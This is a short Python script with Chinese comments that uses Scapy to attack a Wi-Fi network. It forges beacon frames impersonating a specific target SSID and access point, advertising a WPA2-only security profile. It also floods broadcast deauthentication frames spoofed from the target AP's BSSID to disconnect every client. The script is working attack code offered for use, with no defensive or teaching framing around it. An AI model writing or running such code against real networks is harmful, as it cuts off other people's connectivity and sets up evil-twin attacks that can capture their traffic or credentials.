from scapy.all import *
import time

# 设置目标网络的SSID和BSSID
target_ssid = "Xiaomi 13 Pro"  # 替换为目标SSID
target_bssid = "96:44:5D:85:F9:41"  # 替换为目标AP的BSSID

# 设置伪造的AP的BSSID
fake_bssid = "AA:BB:CC:DD:EE:FF"  # 可以伪造任意MAC地址

# 伪造信标帧，显示仅支持WPA2
def create_beacon_frame(ssid, bssid):
    frame = RadioTap() / \
            Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
            Dot11Beacon(cap="ESS") / \
            Dot11Elt(ID="SSID", info=ssid) / \
            Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96\x0c\x12\x18\x24") / \
            Dot11Elt(ID="DSset", info=chr(6)) / \
            Dot11Elt(ID="RSNinfo", info=(
                '\x01\x00'  # RSN Version 1
                '\x00\x0f\xac\x02'  # Group Cipher Suite: TKIP
                '\x02\x00'  # 2 Pairwise Cipher Suites (following)
                '\x00\x0f\xac\x04'  # Pairwise Cipher Suite: CCMP
                '\x00\x0f\xac\x02'  # Pairwise Cipher Suite: TKIP
                '\x01\x00'  # 1 Authentication Key Management Suite (following)
                '\x00\x0f\xac\x02'  # Authentication Key Management: PSK (WPA2)
                '\x00\x00'))  # Capabilities

    return frame

# 发送伪造信标帧
def send_fake_beacons(target_ssid, fake_bssid):
    print(f"Sending fake beacons for SSID: {target_ssid} from BSSID: {fake_bssid}")
    frame = create_beacon_frame(target_ssid, fake_bssid)
    while True:
        sendp(frame, iface="wlan0", count=1, inter=0.1)
        time.sleep(0.1)

# 发送Deauth包以断开所有客户端
def send_deauth(target_bssid, client_mac="ff:ff:ff:ff:ff:ff"):
    # Deauth数据包表示目标AP和客户端的通信应该中断
    deauth_frame = RadioTap() / \
                   Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / \
                   Dot11Deauth(reason=7)
    
    sendp(deauth_frame, iface="wlan0", count=100, inter=0.1)
    print(f"Sending Deauth packets to {client_mac} from {target_bssid}")

if __name__ == "__main__":
    try:
        # 同时发送伪造的信标帧和Deauth包
        send_deauth(target_bssid)  # 断开所有客户端连接
    except KeyboardInterrupt:
        print("Attack stopped.")
